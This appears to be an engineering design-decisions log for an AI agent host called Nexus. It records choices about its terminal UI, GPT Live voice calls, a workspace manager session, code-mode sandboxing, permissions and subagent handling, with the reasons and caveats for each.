  `sidebar_tab`, `sidebar_width` (default closed). The old `sessions_sidebar` preference is left
  alone: the GPUI desktop reads it (default open) from the same `tui.json`, so reusing it would have
  changed the desktop's default or opened the terminal sidebar for everyone. The drag is
  optimistic in Rust and saved once on release. The client yields to the conversation: the sidebar
  hides rather than leaving it under 56 columns, and its width is 24..60 (mirrored constants, pinned
  by `tests/test_ratatui_sidebar.py`).
- **The right sidebar follows the same pattern.** Width persists as `details_width` (default 40,
  24..60), projected as `details_panel.width`; the divider drag is optimistic and saved on release.
  The Changes tab keeps the stored id `Files` (renaming it would invalidate saved preferences and the
  desktop's shared `details_tab`). Each tab builds its own rows in `details_sidebar.rs`: slicing a
  combined list by section title silently broke when a title changed (`MODIFIED FILES` → `CHANGES`).
- **Legacy page kept.** Hosts and fixtures that send no `sidebar.available` (the desktop bridge, old
  snapshots, existing tests) keep the full-page Sessions dashboard.
- Not verified: this change was written without a compiler or a terminal; see "Left sidebar" in
  `ratatui-parity.md` for what was and was not run.

# In-progress Grok TUI implementation notes

- The widget-role foundation is implemented as methods, not role constants.
- Projection/tool verb signals are implemented with focused Python tests passing.
- The host preview contract is implemented. The unrelated fake `_load_config`
  failure in `test_facade_handle_dispatches_every_verb` is pre-existing.
- The Mermaid module is registered and called from `markdown.rs`. Its actual
  reference revision is `559751fdcec02d413e4c57c8832ab275e4f44980`, not the
  planned `2bdd1d6`.
- Double-click on a tool uses a 300 ms window on the same semantic block and
  operation, and toggles local disclosure. A single click selects, and `i` opens
  the full inspector (so nothing the agent saw is unreachable). Local disclosure
  matches on semantic kind and id and ignores presentation metadata.
- Settings hover uses real hit ranges. The dashboard invalidates in-flight work
  when a replacement overlay closes.
- Not claimed: screenshot acceptance, performance acceptance, final combined
  verification, or commits.

## Settings is one root list with drill rows, not an area column (2026-10)

The native TUI Settings modal drops the left list of areas. The root list (client-side,
`settings_page/root.rs`) shows section headers, the local appearance toggles and one drill
row per area from the host's `nav`; drilling sends the existing `nav_select`, and Esc/Left go
back locally. This matches Grok's settings modal and needs no new host command. Cost: the
host still loads Appearance behind the root on open. Appearance and Layout rows are inlined via a
`settings_overview` snapshot field built from those areas' builders (same handlers and
allow-list); Keyboard stays a drill row. Every framed dialog
(pickers, panels, Settings) shares `dialog_frame`: `border` outline, bold title top-left,
clickable `[×]` top-right (`render::close_rect`), and `element` selection fill. Not verified
on a light theme. Every open starts at the root: `RootState::track` runs each frame, also while
the panel is closed (a close used to leave a drilled page behind, so a reopen landed on the
host's default area, Theme). A drill keeps the root up until a snapshot selects another area,
so the previous area's page never flashes.

## Sessions dashboard groups by status, answers permissions in place (2026-10)

Supersedes the time grouping in the next entry. The P-SES design groups by status (Needs
you, Working, Idle, Archived) so what waits on the user is first; a Needs you row shows the
pending question and `a`/`d` answer it through `PermissionResolve` without opening the
session. The host adds `ProjectSessionsList.archived` (newest N archived rows, opt-in; a search
matches archived rows too and the picker opens the Archived group while searching) and `ProjectSession.pending`; the bridge accepts an answer only for the
`request_id` the listed row carries and only `allow_once`/`deny_once`, so a stale or forged
operation cannot widen authority. "Open Previous" was removed (`/resume` remains).
`PermissionView.ts` of a pending request is now the request time, so a prompt can count
"waiting on you" from it and survive reconnect (the log carries it).
The permission prompt's key chips stay one per row to reuse the click and hover mapping.

## Sessions dashboard groups by time and previews only on keyboard selection (2026-10)

Superseded in part: the preview pane (the `Response` box) was removed; see "Sessions dashboard has no preview pane" below. The time grouping was replaced by status groups (above).

The native dashboard groups by last-updated local time (Today, Yesterday, This week,
Earlier) instead of status: people look for "the thing I did recently", and status is
still carried by the row glyph and header chips. The host computes `bucket` and
`updated` per row so the client needs no time zone logic. The `Response` box now follows
only the keyboard selection: hover used to swap it under a resting pointer and made the
list jump, so hover is a background tint only and a box appears after Up/Down with an
empty composer. Up from the top row opens the search bar (also `/`, a click, `Ctrl+K`).
The `[×]` keeps the archive confirmation. Not verified on a light theme.

## Turns held by the global cap are shown, from supervisor state (2026-10)

An idle session whose submit the supervisor parks (all `max_concurrent` slots busy)
looks exactly like an idle send that is about to start, so the native client hid the
message. The supervisor now reports `slot_wait` on its `daemon.session_*` events and
on each follow subscription's first frame instead of the client guessing from the
durable log: the wait is scheduling state, not history, so it is not journaled and
a reconnect re-derives it. The head entry is kept only while `slot_wait` is set, so
the "steer" flash fix for ordinary idle sends stands. The count of running turns is
a snapshot at the last event and may lag while the session stays parked.

## Sessions dashboard has no preview pane (2026-10)

The dashboard has no preview: no `SessionDashboardPreview` host command or
`SessionDashboardPreviewResult` (with `PreviewRow` and `PendingInput`), no client
`dashboard_preview` method, no `preview` key on the dashboard snapshot, no preview pane
in the Rust terminal client, and no `session_preview` dashboard operation. The list
(`ProjectSessionsList`, about 10 ms) and its schema 4 row snippets remain. The archive
`SessionPreview` command is unchanged.

Why: `dashboard_preview` replayed the selected session's whole event log through the
reducer on the daemon event loop, and the dashboard re-polled it every 0.5 s. Measured
0.40 s for a 12k-event session and 1.83 s for a 19k-event session, so `/sessions` felt
slow and blocked other daemon requests. Caching was considered; removing the preview
was chosen. Not verified: that the concurrent removal is complete in code.

## Sessions dashboard has no composer (2026-10)

The native client does not draw the composer on the Sessions dashboard
(`render::composer_height` is 0 while a dashboard is shown), and `main.rs` no longer
routes dashboard keys into a draft: list shortcuts, search and rename own their keys and
everything else is ignored. Enter opens the selected session. Sending to a selected
session from the dashboard is gone.

Why: a hidden-or-duplicate input under the list made typing ambiguous (search versus
message) and cost rows the list can use. Not verified: visually in a real terminal.

## Failed tool calls do not open a group; the failed count is dark red (2026-10)

A folded tool group draws only its header (and the live tail while running). The native
client used to draw failed members under the folded header, which in effect expanded the
group; `transcript/groups.rs` no longer does. The `· N failed` count stays in the header,
coloured with the new `Palette::error_deep` (dark `196,66,88`, light `160,28,48`), darker
than `error`, which was too light there. The Python projection still sends `failed_members`
(operations stay allowed); the web app has no such rule.

Why: the user wants groups collapsed by default regardless of outcome and opens them
manually. Not verified: visually in a real terminal.

### Update: light group headings, no counts, no group animation (2026-10)

The header no longer shows `· N failed` or a thought count (`verb_groups.py` leaves thoughts
out of the label counts; thoughts stay members). It is drawn in the muted, non-bold style
with the disclosure glyph at all times: no group spinner, and the running `Thinking…` row
is static too. A failed member tints the header glyph `error_deep` and stays red in its own
row. Only an individual running tool (including the folded live tail) animates. Bash rows
show the first command line plus `…` when more lines follow (`format_arguments`); Read rows
keep `path  (offset=…, limit=…)`. The full command and arguments stay in the expanded body
and `tool_details`. Not verified: visually in a real terminal.

### Update: grey running tree, edits grouped apart, no red (design overhaul step 5)

Superseded in part: a running group is `▾ Working` with its newest five members as a
grey tree even when folded (the single live tail and the one-member live preview are
gone), a failed member ends in a quiet ` · failed` instead of red, and a finished group
settles with a short row-by-row fold and header flash. The `· N failed` count stays out
of the header. File changes (`edit`, `write`, `apply_patch`, …) group only with each
other: changes are what a reader audits, so they must not hide inside a read run, and a
lone change keeps its own row. Failure still needs some mark (nothing the agent can see
may be hidden), hence the quiet word rather than silence. `Palette::error_deep` is no
longer used by groups. Not verified: visually in a real terminal.

## Design overhaul steps 6, 7, 11, 14: client-only animation lives in the cache (2026-10)

The thinking decode (the `∴` status line), the Live
phase strip and the pinned-card indicator add no host data and nothing durable: they are
presentation of existing snapshot fields, so a replay and a live run agree (rule 5). Motion
state is a short transient in `render::Cache` (`mic: live_bar::Mic`)
and cached rows stay tick-free: the decode and the phase strip are rebuilt per frame. `animating(&Snapshot)` cannot see a
cache transient, so `main.rs` also keeps the clock running while folds are live. Pinned card: STK-3
(the plan's default; the pick is still open) shows how many rows of the turn are above, counted
from the card's real end rather than the plan's `offset - first - rows`, which over-counts for
a clipped long message. The Live header dropped the `mic`/`spk` meters and the `Live` title for the
phase strip, so the output level now only damps the speaking wave; the host sends no playback
position (not verified), so the word-by-word caption highlights the newest word of the delta.
New glyphs have ASCII fallbacks chosen in the modules (`#-`, `_.:-=+*#`, `|/-\`, `~`, `.`, `^`,
`:`) rather than in `rust/widgets/src/glyphs.rs`. Not verified: visually in a real terminal.

## Slow commands do not block the connection's read loop (2026-10)

The daemon read loop awaited every command before reading the next frame, so the
startup `Doctor` (full `PRAGMA quick_check` and session-tail scan over a ~1.7 GB
`nexus.db`) delayed a `SessionOpen` sent right behind it on the chat client's single
connection. Measured on a cloned cold database: session open 13.2 s behind Doctor,
1.8 s after the change (0.4 s warm). `Doctor`, `UpdateStatus`, `ModelsList`,
`ModelsRefresh` and `SetupStatus` now run as bounded background tasks
(`SLOW_COMMANDS` in `host/daemon.py`); all other commands keep strict arrival order.

Why: results are already matched by frame id, so out-of-order replies are safe, and
detaching only the known slow commands avoids reordering pipelined session commands.
Not addressed: Doctor itself still reads the whole database cold (it competes for disk
with the first session read; the remaining 1.8 s vs 0.4 s warm), and the TUI's own
request path was not changed.

## Tier edits apply live, without a daemon restart (2026-10)

Settings -> Models reorders, adds and removes tier models (and sets tier efforts).
`HostFacade` used to reload only when no turn was running; otherwise it wrote the
config, returned `restart_required=True`, and the new order never applied until a
restart. It now always calls `Runtime.reload_tier_config` (tier table, registry
re-index, `ModelRouter.set_tiers`), which touches no provider. Subagent models are
resolved at spawn, so the next spawn uses the new order; running children keep their
model. `restart_required` remains only for runtimes with injected routes, and for
provider-changing settings, which still need an idle runtime.
Test: `tests/test_host_tier_hot_apply.py`. The roster's effort labels now read the
router's live efforts (see the next entry).

## `subagent` roster change notice at the history tail (2026-10, plan 06)

The tool description lists tier models and effort. Changing them costs one
`system_tools` cache miss, accepted. The model is told through a short user-role
notice appended at the **tail** of persisted history, which adds no second miss; it
names the setting and defers to the description (no model ids or efforts).
Corrections to the first plan text: the notice is driven by the **request boundary**
(the digests of the schemas about to be sent), not by `reload_tier_config`, so it
matches what the next request advertises, including a reload during a running turn;
and old notices are **never stripped** (that would rewrite the cached prefix), they
age out through ordinary compaction/handoff. Digests are split (models, efforts) so
the text is precise, taken from the advertised tier lines (not role descriptions),
and stored as `context.notice` events, so resume and fork do not repeat. The first
observation is a baseline event with no message. Per-role `reasoning_effort` is shown
in the roster but is not tracked. Cost: `MessageMeta.notice` adds `"notice": null` to
stored messages. Not verified: provider-usage evidence of the single miss.
Tests: `tests/test_subagent_roster_notice.py`.

## Transcript keeps a 20-row bottom buffer, and following parks there (2026-10)

The last reply sat against the composer. A transcript taller than the viewport now scrolls
`BOTTOM_BUFFER` (20, clamped to viewport - 4) blank rows past the last content row. That bottom
position is the follow position, the scroll-down clamp and the scrollbar range, all from one
function (`session::live_offset`); the earlier stuck-scroll bug came from these disagreeing. The
pinned-prompt tail padding is unchanged, and `max_scroll` takes the larger of padding and buffer.
Transcripts that fit the viewport get no buffer, so they never scroll. Tests: see
`docs/ratatui-parity.md`. Not verified: feel in a real terminal (only TestBackend and unit tests).

## GPT Live: upgrade webrtc-rs instead of vendoring a patch (2026-10)

Calls dropped at about 43 s. The cause is webrtc-ice 0.13, which sends an ICE consent
check only when the path is idle, so audio never triggers one and the server ends the
media path (see [live.md](live.md#root-cause-of-the-43-s-drop)). We upgraded the
`nexus-live` helper to `webrtc = "0.17.2"` (webrtc-ice 0.17.2), which contains the upstream
fix (pion/ice PR #767, webrtc-rs/rtc PR #86). Vendoring and patching webrtc-ice 0.13 was
rejected: it would carry a fork of ICE code we do not own, and the upstream release already
fixes it. The locked version is pinned by `tests/test_live_packaging.py`. Not verified
against a real call.

## Terminal shows the open call in a pane above the composer; the card follows once it ends (2026-10)

The Live card was a timeline block, so a long call pushed the conversation and the
controls around. In the terminal the open call's rows now sit in a 5-row pane between the
timeline and the composer. It follows the newest rows, the wheel scrolls it, and a button
expands it to read the transcript; the expanded state is local and resets when the call ends.
The open call is left out of the timeline, and its card joins the timeline once the call
ends, so the record reads in call order. The desktop client keeps the card in the timeline
during a call, because its layout has no pane. Tests: `tests/test_ratatui_live.py`. Not verified
in a real terminal.

## GPT Live: delegation text is the heard utterance; no voice-authored handoff yet (2026-10)

Decision: keep `delegation: {type: client}` and record, on `live.delegated`, `source`,
`heard` and `verbatim` beside `text`, instead of declaring a `send_to_agent` function tool.
Reason: in the recorded call `session-1ce5e575` every delegation text equals the user's
transcript although the instructions demand a rewrite; the public GPT-Live docs describe no
session-level function tools for the voice model (only `delegation.responses.tools`, which
runs OpenAI's backend), and OC's `end_call` is a tool of its coding agent, not of the voice
model. Declaring tools would be a guess against an undocumented endpoint, with a risk of
double-enqueueing. Known gap: the voice model cannot yet send its own wording; a live spike
with `[live].log_raw` should test a `tools` array on the session. Details:
`plans/done/GPT_LIVE_PROTOCOL_NOTES.md` "Authorship of delegation text".

## GPT Live: Codex-style handoff, transcript context and speakable replies (2026-10)

Decision: the agent receives the delegation text plus a labelled transcript of both speakers
since the previous delegation and a speech-recognition note, as one plain-text user message
(`bridge.compose_request`); the final answer goes back as plain speakable text via
`session.context.append` with no label and no delegation id. The "rewrite before you hand off"
instruction is removed.
Reason: Codex (commit 6ae8b8aa, `core/src/context/realtime_delegation.rs`, `core/src/realtime_conversation.rs`,
`codex-api .../methods.rs`) does exactly this on `gpt-live-1-codex`: no voice-authored message
exists, so the agent gets the heard input and the recent transcript (input keeps its start,
transcript keeps its end; Codex bounds both at 4 KiB, Nexus later raised the bounds so a long
spoken request is not cut, see `live.md`) and the TUI replies with a speakable session append. The
"Agent Final Message" label is a v1 artefact of other clients. Nexus data already showed the
rewrite rule had no effect.
Why in the message text and not hidden: Nexus shows the user everything the agent sees; the
reducer has an `origin` label but no hidden-context channel for user messages, so the transcript
is visible in the timeline and replays from `input.queued`. Progress and notices keep the
delegation id (Codex's core-managed path); only the final answer follows the TUI path.
Not verified against the real service: that the service accepts a final append without the
delegation id, and what a voice model does with it. Tests: `tests/test_live_bridge.py`,
`tests/test_live_manager.py`, `tests/test_live_protocol.py`. This supersedes the "no
voice-authored handoff yet" gap above: the gap stays, the handoff no longer depends on it.

## GPT Live: Codex-style sideband (no client pings, unlimited backoff reconnect) (2026-10)

Decision: the sideband sends no client WebSocket pings, retries an early 404 on the initial join
(100/300/800 ms), and after an unclean loss reconnects with backoff 200 ms doubling to 5 s, the
counter reset by a 30 s stable connection, until a 404/410, an auth refusal, a clean close, stop or
the call deadline; our own addition is a 5-minute cap on continuous failure. Sends that never reached
the socket wait up to 10 s for the reconnect; a write that failed or timed out is still never replayed
(`live_send_ambiguous`). Reason: this is what OpenAI's Codex does (see
`plans/done/GPT_LIVE_CODEX_REFERENCE.md` section 2: no client pings, `sideband.rs` reconnect loop,
`methods.rs` early-404 retry), and the old 2-attempt, never-reset budget ended a call on a brief blip.
Costs: a half-open socket is no longer caught by a pong deadline (only reads, failed writes, server
close); Codex replays a pending message after reconnect and we deliberately do not, because a replay can
duplicate a delegation. Tests: `tests/test_live_transport.py`. Not verified against the real service.

## GPT Live: pause is bounded mute, not a held-open call (2026-10)

Decision: `Ctrl+X P` / `/live pause` silences the microphone (helper sends silence) and the voice's audio, holds
voice-bound updates (<= 8, commentary dropped) and ends the call with reason `pause_timeout` after
`[live].pause_seconds` (120); a later `Ctrl+X P` starts a new call that carries the transcript over (the
existing handoff). Stop stays `Ctrl+X D`. `Ctrl+X F` was not used: it is Fork session in both clients.
Reason: OpenAI's Realtime costs guide bills GPT Live per second of session time including silence and says
muting "does not close the session", so a pause that keeps the call open keeps billing; and Nexus cannot close
the socket and keep the call (WebRTC media dies with the peer, no resumable call id). Codex has only mute, the
same silence-over-RTP behavior. Cost: a pause longer than the window loses the live voice context and is a new
call (transcript carried over, not the model's hidden state). Not verified: real billing on a ChatGPT-account
call, and a sideband cancel for a response already being produced. Details: [live.md](live.md#pause-vs-stop).

## Context header: bars and grow animation removed

Design overhaul step 7 gave the context header grey texture bars per block and a grow animation
replayed whenever a session opened. After review the user asked for both to go: the header now
draws its final state at once, with the `total ... of the window` row kept (it reads fine without
bars). `context::Anim`, `Cache.ctx` and the `main.rs` frame-clock hook are gone; the window for
the share lives in `Cache.context_window`.

## The workspace manager session: a pinned, eight-tool session in the main namespace (2026-10)

Plan 02 ([manager.md](manager.md)) adds one durable session per workspace that starts, watches and reads
the user's root sessions. What we decided, and why:

- **Kind `manager` in the main namespace, fixed id `nexus-manager`, no schema change.** The `sessions.kind`
  column already exists; the kind is written with the row at its first input. A new namespace would have hidden it
  from `LiveStart` and `SessionEnqueue`; lists exclude it by kind instead. The id is reserved so `ManagerOpen` is a
  true singleton, and `[manager] enabled = false` (default) makes every operation on it fail, so rollback is the flag.
- **Managed links are `session.linked` records in the manager's log**, not columns on the child. The edge is
  written before the root starts, so no started root lacks its link; the manager's authority to read or cancel is
  derived from that log, never from model text.
- **A launch needs a real user prompt in the current turn, named by id, and passes caps**
  (3 per turn, 8 live). Launch, cancel and send need **no approval** and work unattended (updated: the earlier
  design asked the viewer every time and denied unattended); the manager permission engine allows exactly the
  manager catalog by name and denies any other tool, and provenance, ownership and caps are the guard. A launched root is an ordinary root: workspace default model, normal
  root permissions, nothing inherited from the manager.
- **`session_show` is a durable request, not a UI command, and needs no approval.** The host cannot reach a
  client's screen, so it writes one `manager.show` record in the manager log (target, origin message id, turn, the
  clients that reported the manager in front, a Live flag, an expiry 30 s ahead; no user text). A native client acts
  only on a fresh, unreplayed record that names it and still shows the manager (or whose own Live call follows the
  manager), and never over a modal, form, dashboard, recording or pending prompt. The tool result says `requested` or
  `no_viewer`, never that the session is on screen. The cost: a Live call that mis-hears "show me X" can move the
  user's screen without a prompt ([security.md](security.md)); nothing is sent, started or cancelled by it.
- **No model override on launch.** The Live transcript carries model-authored `Voice:` lines, so "the human named
  this model" cannot be checked literally; launched roots use the workspace default.
- **Result reads need a reason**: the manager launched the session, or the user named it in their latest message.
  For GPT Live only the delegated request counts, never the `Voice:` lines of the transcript it carries.
- **`session_wait` ends on new user input and never cancels a target.** While it waits it lends the manager's
  supervisor slot back (`Supervisor.lent_slot`) so launched roots can run at a cap of 1; the manager resumes
  without queueing, so the cap may be exceeded by that single turn until another turn ends.
- **No hooks, no auto title, no summary call** for the manager: a hook is an arbitrary process, and a second model call
  breaks "pinned, no fallback of any kind". The model is `github-copilot/gpt-6-luna` as a concrete reference, never
  a tier.
- **GPT Live on the manager needs a second, separate consent.** The call carries what the manager reads of other
  sessions to OpenAI, which the base notice does not cover. It is versioned on its own so existing consent stays
  valid for ordinary calls.
- **Off by default, no real-provider soak.** The backend is tested offline only; native UI and a soak against real
  Copilot and GPT Live come before the default flips.

## The manager compacts lazily at turn admission, with deterministic memory and a per-request state block (2026-10, plan 10)

Details in [manager.md](manager.md#automatic-compaction-and-machine-memory).

- **Lazy at admission, not a timer and not a tool.** An in-memory timer loses state on restart and wakes an idle
  daemon; a model-callable compact tool lets a `<session_result>` erase context. The idle clock is the newest
  activity record in the manager's own log (not presence, queued input or the audit record), so it survives
  restarts. Default 55 minutes, configurable 5-1440.
- **Memory first, then handoff.** The note goes to the `kv` table before anything is retired; a failed write aborts
  and a failed handoff keeps the note. No second model (the pin forbids it), so extraction is deterministic and
  reads only structured events and real user prompts, never assistant prose or titles. It is not `MEMORY.md`, which
  stays human-owned.
- **State is a snapshot, not memory.** What Nexus looks like *now* is rebuilt for every model request and never
  persisted, so compaction and restarts cannot carry a stale state as truth; memory only says what happened.
  The snapshot confers no authority (tools do not read it). Resolved v1 choices: refresh per request (D1);
  `review` = awaiting permission/input only (D2); `archived` is `n/a` because archived roots are invisible (D3);
  `done` reuses the 2 h recent window (D4); 12 rows / 1,800 chars (D5); the method is
  `ManagerPort.state_snapshot()` (D6); GPT Live gets it only through the manager, under the existing consent
  (D7, wording not re-checked). Changing system tail per request may cost Codex prompt-cache reuse: not
  measured; `[manager] state_snapshot = false` is the switch.

## Status line: grey shimmer instead of the decode scramble

Design overhaul step 6 scrambled a window of graphemes in the activity word with random glyphs and
`p.purple`. At the user's request it is now a shimmer that moves from light grey to dark grey: the word
always shows its real characters, a highlight sweeps across it every 1.8 s on the 30 Hz motion clock, and
the `∴` is grey too. The word stays readable at every frame, and only colours change, so the `[stop]`
geometry is untouched. Animations off: static dark grey; Monochrome: plain text.

## Session names live in the row, not the log

A session's name is stored in `sessions.name` and `session_names`, not as a
`session.named` record. Plan 03 section 3.1 proposed an early record; we chose
the row because an extra first record shifts every seq and costs a record per
session, while the name is already durable and globally unique in SQLite.
Exports carry it (a synthesized leading line in JSONL) and import keeps it when
free. Old logs that contain `session.named` still replay.

## Code mode: per-call helper process, not a daemon-owned pool

*Superseded for the kernel tools by the long-lived `KernelHost` (kernel plan Phase 1); the
reasoning about Monty's missing env and cwd controls still holds. Kept as history.*

Plan 03 proposed a daemon-owned Monty pool. Monty 1.1.0's `AsyncMonty` has no
environment or cwd controls, and mutating the daemon's own `os.environ`/cwd races
with other work. Nexus instead runs a short-lived Python helper per `code` call
(`tools/codemode/monty_adapter.py`) with a minimal env, a private temp cwd and a new
process group; the helper owns a one-process Monty pool and the whole group is
killed on finish, cancel or deadline. Cost: a cold start per call (latency and RSS
not verified). Gain: stronger isolation and a simple cancel story. Revisit if a
Monty release adds per-worker env/cwd. See [codemode-monty-compat.md](codemode-monty-compat.md).

## Code mode: flat sandbox names

Tools are bare function names; helpers are `search_tools`, `describe_tool`, `store`,
`load`, `store_delete`; context reads are `context_*`. Dotted `ctx.*` was dropped:
dotted-name callbacks were unverified in Monty and flat names are shorter for the
model. Unsafe or colliding tool names are skipped and listed, never renamed silently.

## Code mode: `ToolError = RuntimeError`

Monty 1.1.0 has no class inheritance, so a prelude aliases `ToolError` to
`RuntimeError`. Consequence: `except ToolError` also catches any `RuntimeError`.
Accepted; diagnostics still name the real kind.

## `ContextQuery` under `mode = allow`

`ContextQuery(<name>)` always asks unless an explicit rule or grant allows it, because
reading another session's context is the sensitive path; `mode = allow` does not cover
it. The engine keeps its order (`deny`, grants incl. "always allow", `allow` rules such
as `ContextQuery(*)`, `ask`) and only the mode fallback differs (`_MODE_FALLBACK_ASK_TOOLS`
in `tools/permissions.py`); `mode = deny` still denies and unattended sessions follow
`on_unattended`. Authz (ancestry, `context_read`, project, trash) is separate and still
denies, so approval cannot widen scope.

## `llm()` sub-calls use a per-program budget

The turn-shared subagent tree budget is not reachable from `Runtime` where the
context provider is built, so `llm()` is charged to a bounded per-program
`SubagentBudget` (16 calls, 32k input, 200k total tokens, depth 1). Known gap: spend
is not deducted from the turn's tree budget.

## Plan 03 scope decisions (U1-U8)

No rename (U1); batch backfill of names, at most 500 per transaction (U2); manager
never gets context (U3); external-worker transcripts unreadable (U4); no deeper
recursion or plain-mode `llm()` before evaluation (U5, U8); `read_only` exposure and
no "only" mode (U7). Context is root-sessions-only in v1.

## Session names: vocabulary size

229 adjectives x 56 colours x 188 animals = 2,410,912 bases (about 21.2 bits), words
of 3-9 letters so a `-99` suffix fits 32 characters. Display identity only, not a
secret. Why the name is in the row and not the log: see "Session names live in the
row, not the log" above.

## A subagent report is a root input, not a new event

Phase 3 of the non-blocking plan delivers a background child's report as an ordinary
root input (`steer`, `origin.kind = "subagent_report"`, `client_request_id =
"subagent-report-<agent>-<run>"`; the plan's `:` is outside the request-id charset).
The delivery record is the `input.queued`/`input.consumed` pair plus `agent.completed`;
there is no `agent.reported`. Trust: the text is a user-role message but is wrapped in
a fixed header saying it is an automated report that cannot grant permission or
authority; the permission engine ignores message roles; `UserPromptSubmit` hooks do
not run on it; the human sees the origin label. Its trust level is unchanged from the
tool result it replaces. Esc keeps queued reports (typed input is dropped) and does not
wake the root; it never cancelled children once they became detached. The auto-wake
cap (`agents.max_auto_wakes`, consecutive report-initiated wakes without a human
message) pauses delivery with a durable `context.notice` rather than dropping anything;
the next human message resumes it. A restart never starts model calls on its own:
reconciled `interrupted`/`cancelled` runs are queued without a wake. The one-shot wait
is decided by the daemon (`SessionActivity.wait_seconds`) so a client needs no config.

## Background subagents reuse the root's input queue (2026-10-20)

Reports from finished children will be delivered as root inputs (`mode = steer`,
`origin = {"kind": "subagent_report", ...}`) through the existing durable queue, not
through a new `agent.reported` event or a context-injection block. The queue already
survives restart and replay, is consumed at every iteration boundary, wakes an idle
root through the supervisor and batches for free. Phase 1 and 2 of
`plans/done/NONBLOCKING_SUBAGENTS_PLAN.md` land only the inert half: the
`agent.resumed`/`agent.stopped` events, the `AgentView` fields, the `origin` kinds,
the `[agents]` keys and the agent pool; phase 6 then made non-blocking the default.

## Background children are owned by a per-session pool, not the turn (2026-10-20)

A detached child needs a runner, budget, event sink and cancel token that outlive
the turn, so `AgentPool` (`nexus/agents/pool.py`) owns the run task, the tree budget
and the root event port. Ending or interrupting the root turn deliberately does not
cancel children (the point of non-blocking); `AgentCancel` and shutdown do. The
token/cost/fan-out counters stay per root turn (`begin_window()`), matching the old
per-turn budget; concurrency and `max_live` span turns. Per-session token/cost
budgets are an open question (plan Q2). `agent.spawned`/`agent.completed` are
emitted for blocking children too, with `background` and `run` fields.

## Subagents persist and can be continued; authority never widens on a continuation (2026-10-20)

A Nexus-native child goes idle when its run ends instead of dying (`agents.background`
on, the default since phase 6), and the root continues it with `subagent_send`: the
child's own durable session already is "the full prior conversation", so a continuation
is `run_turn` on the same session with a new user input (`ChildSpec.resume`). It holds
its `max_live` slot until `subagent_stop`/`AgentClose`. Reasons for the shape:

- **A continuation can only shrink.** It reuses the spawn-time tool ceiling, permission
  snapshot and grants (`PreparedChild`). After a restart the recipe is rebuilt from the
  root log through the same `select_tools` path with `tools = recorded`, i.e. `current
  root ceiling ∩ role ∩ recorded`. Rejected: re-deriving from the role alone (a role edit
  could widen) and trusting the log's tool list over the live ceiling (a tightened
  ceiling would not apply).
- **`send` and `stop` are keyed by the child's own `<role>:<tier>`** and share `Task(...)`
  rules, so `deny Task(*:high)` also blocks continuing a high-tier child; `list` is
  read-only and always allowed.
- **Claude Code workers continue by resuming their Claude session; other external workers do
  not (2026-10-24, replaces the v1 "external workers are not continuable").** A completed
  worker child records, in its own `agent.config` (last record wins), an `external` block: the
  Claude session id the worker reported, the exact model, and a fingerprint of the worker
  policy (permission mode, tools, allowed/disallowed tools, setting sources, MCP digest,
  restricted). A follow-up runs `claude --resume <session>` with the same policy flags and
  only the follow-up prompt (the role instructions are already in that session) as run N+1.
  The log is the authority after a restart. If the policy fingerprint or model no longer
  equals the recorded one, or the tier was lowered, the follow-up is refused unchanged
  (never widened, and not silently narrowed): start a new subagent. If Claude reports a new
  session id on resume (not verified), the worker follows it and a newer record is written.
  Antigravity stays not continuable (agy closes stdin at the end of a run); the refusal names
  the worker kind. Children from before this change have no record and are refused with an
  "external worker started before ... could be continued" message.
  `claude_code_subagent_backend = "sdk"` children are normal Nexus children and continue.
  Not verified against a real `claude` binary: only `claude --help` (2.1.310) was checked for
  `--resume`/`--fork-session`; behavior is covered by the fake CLI in `tests/claude_code_fakes.py`.
- **A send to a running child is refused, not queued** (plan Q3): queueing needs
  child-side steering; the refusal says to wait for the report or stop it.
- **A worktree child is reopened (`finalized -> active`) and every review and
  acknowledgement is voided**, because the child can change the checkout again; the old
  `review_id` must never be usable for `integrate` or `discard`. Integrated, discarded,
  cleanup-pending and legacy records refuse.
- **The root log is the authority after a restart.** The pool rebuilds records from
  `agent.*` events (`records_from_events`), not from a reduced view, and re-charges the
  `max_live` slots of children that can still be continued. An `agent.spawned` with no
  later `agent.completed` that this process does not run is `interrupted` (continuable),
  and its report is queued without waking the root.
- **Persistence follows `agents.background`**: with it off the tool schema is unchanged
  and a child releases its slot at the end of its run. Phase 6 turned it on by default.

### Subagents are non-blocking and persistent by default (plan phase 6)

- **`agents.background` defaults to true.** The root agent should keep working while a
  child runs, and a finished child should stay available for follow-ups. `background =
  false` restores the blocking result and non-persistent children. `wait: true` on a
  call blocks for that one child (and the child is still persistent).
- **The model is taught, not just enabled.** Without prompt text a model polls or
  re-spawns. The `subagent` description, the three control tools and the `build` and
  `orchestrator` role bodies say: start independent children together, keep working or
  end the turn, never poll, `wait: true` only when the answer is needed now, continue
  with `subagent_send`, close with `subagent_stop`.
- **Idle children hold `max_live` slots, so a lazy root could lock itself out. The
  harness evicts instead of refusing.** When a spawn would exceed `max_live` and a child
  is idle or interrupted, the least-recently-run one is closed (`agent.stopped`, `by =
  "system"`, a reason naming the eviction) and the spawn proceeds. Refusal only when every
  live child is running. Reason: an idle child costs nothing to lose (its log and worktree
  are kept, and a new subagent can be started from its report), whereas a refusal stalls
  the root until it remembers `subagent_stop`. Eviction is visible in the timeline, one per
  spawn, and never touches a running child.
- **`nexus run` waits for children** up to `oneshot_wait_seconds` (phase 3), so the new
  default does not make one-shot runs exit before the report.

## Subagents are foreground-only; supersedes the background flow

The four decisions above (reports as root inputs, the per-session pool, persistent and
continuable children, non-blocking by default) are **superseded**. The `subagent` tool is
the only model-facing subagent tool and always blocks: its schema is `prompt`,
`subagent_type`, `tools`, `model`, `description` and `worktree`, with no `background` or
`wait`. `subagent_send`, `subagent_stop` and `subagent_list` are gone from the tool
registry, the `task` bundle, the code-mode catalog, the permission rule family and the
auto-add that attached them to `subagent`. Reasons:

- **A detached child needed a second delivery path** (report queue, auto-wakes, replay on
  open, one-shot waiting, eviction of idle slots) that models rarely used well: they
  polled, re-spawned, or forgot to close children. A blocking call returns the report
  where the model asked for it, with nothing to reconcile after a restart.
- **Concurrency is kept without detaching.** Independent `subagent` calls issued together
  in one batch run in parallel and the turn waits for all reports; the `build` and
  `orchestrator` prompts say so. Ending the root turn cancels its children.
- **Compatibility, not deletion of history.** Old logs replay: background spawns,
  `agent.resumed`, `agent.stopped`, report inputs and wake-paused notices still fold and
  render. A legacy child whose last run completed reads as finished, not idle; a running
  one can still be cancelled; host `AgentClose` stays. `agents.background` (and the
  report/wake keys that served it) parse and are ignored. Role files naming the old control
  tools get an unknown-tool warning. `Task(<role>:<tier>)` spawn permission keys are
  unchanged.
